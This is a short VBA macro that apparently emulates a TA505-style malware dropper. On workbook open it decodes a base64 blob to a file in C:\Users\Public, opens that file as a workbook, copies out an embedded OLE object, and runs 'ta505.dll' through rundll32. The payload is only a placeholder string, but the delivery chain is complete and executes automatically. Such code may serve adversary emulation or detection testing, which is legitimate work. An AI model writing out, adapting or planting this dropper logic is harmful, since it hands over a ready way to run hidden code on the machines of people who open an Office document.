Sub abc()
    Dim buff As String
    buff = ""
    buff = buff + "abc"

    Dim paperdec() As Byte
    paperdec = DecodeBase64(buff)
    
    Dim path As String
    path = "C:\Users\Public\paper.xls"
    
    Open path For Binary As #1
    Put #1, , paperdec()
    Close #1

    Dim wb As Workbook
    Set wb = Workbooks.Open(path)
    wb.Sheets(1).OLEObjects(1).Copy
    CreateObject("Shell.Application").Namespace(ActiveWorkbook.path).Self.InvokeVerb "Paste"
    
    wb.Close SaveChanges:=False
    'bad
    Call Shell("rundll32.exe C:\Users\Public\ta505.dll, main")
    
End Sub
'http://web.archive.org/web/20060527094535/http://www.nonhostile.com/howto-encode-decode-base64-vb6.asp
Private Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML
    Dim objNode
    
    Set objXML = CreateObject("Msxml2.DOMDocument.6.0")
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
    
    Set objNode = Nothing
    Set objXML = Nothing
End Function
Sub Workbook_open()
    abc
End Sub
